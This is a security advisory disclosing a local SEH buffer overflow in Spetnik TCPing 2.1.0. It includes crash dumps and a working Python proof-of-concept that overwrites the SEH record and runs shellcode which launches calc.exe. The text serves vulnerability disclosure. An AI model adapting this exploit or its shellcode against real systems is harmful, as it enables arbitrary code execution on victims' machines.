'''
[+] Credits: hyp3rlinx

[+] Website: hyp3rlinx.altervista.org

[+] Source:
http://hyp3rlinx.altervista.org/advisories/AS-TCPING-2.1.0-BUFFER-OVERFLOW.txt


Vendor:
================================
Spetnik.com
http://tcping.soft32.com/free-download/


Product:
=================================
Spetnik TCPing 2.1.0 / tcping.exe
circa 2007

TCPing "pings" a server on a specific port using TCP/IP by opening and
closing a
connection on the specified port. Results are returned in a similar fashion
to that
of Microsoft Windows Ping. This application is intended for use in testing
for open
ports on remote machines, or as an alternative to the standard "ping" in a
case
where ICMP packets are blocked or ignored.


Vulnerability Type:
===================
Buffer Overflow


CVE Reference:
==============
N/A


Vulnerability Details:
=====================

If TCPing is called with an specially crafted CL argument we will cause
exception and overwrite
the Pointers to next SEH record and SEH handler with our buffer and
malicious shellcode.
No suitable POP POP RET address is avail in TCPing as they start with null
bytes 0x00 and will
break our shellcode. However, TCPing is not compiled with SafeSEH which is
a linker option, so we
can grab an address from another module that performs POP POP RET
instructions to acheive
arbitrary code execution on victims system.


stack dump...


EAX 00000045
ECX 0040A750 tcping.0040A750
EDX 41414141
EBX 000002CC
ESP 0018FA50
EBP 0018FA50
ESI 0018FD21 ASCII "rror: Unknown host AAAAAA....
EDI 0018FCC8
EIP 0040270A tcping.0040270A
C 0  ES 002B 32bit 0(FFFFFFFF)
P 1  CS 0023 32bit 0(FFFFFFFF)
A 1  SS 002B 32bit 0(FFFFFFFF)
Z 0  DS 002B 32bit 0(FFFFFFFF)
S 0  FS 0053 32bit 7EFDD000(FFF)
T 0  GS 002B 32bit 0(FFFFFFFF)
D 0
O 0  LastErr WSANO_DATA (00002AFC)
EFL 00010216 (NO,NB,NE,A,NS,PE,GE,G)


WinDBG dump...


(17a8.149c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for image00400000
*** ERROR: Module load completed but symbols could not be loaded for
image00400000
eax=00000045 ebx=00000222 ecx=0040a750 edx=41414141 esi=0018fd21
edi=0018fcc8
eip=0040270a esp=0018fa50 ebp=0018fa50 iopl=0         nv up ei pl nz ac pe
nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
efl=00010216
image00400000+0x270a:
0040270a 8802            mov     byte ptr [edx],al
 ds:002b:41414141=??


Exploit code(s):
===============

Python script...
'''

import struct,os,subprocess

#Spetnik TCPing Utility 2.1.0
#buffer overflow SEH exploit
#by hyp3rlinx


#pop calc.exe Windows 7 SP1
sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")

vulnpgm="C:\\tcping.exe "

nseh="\xEB\x06"+"\x90"*2                          #JMP TO OUR SHELLCODE

seh=struct.pack('<L', 0x77214f99)                 #POP POP RET

payload="A"*580+nseh+seh+sc+"\x90"*20             #BOOOOOOOM!

subprocess.Popen([vulnpgm, payload], shell=False)


'''
Exploitation Technique:
=======================
Local


Severity Level:
=========================================================
High


===========================================================

[+] Disclaimer
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author.
The author is not responsible for any misuse of the information contained
herein and prohibits any malicious use of all security related information
or exploits by the author or elsewhere.

by hyp3rlinx
'''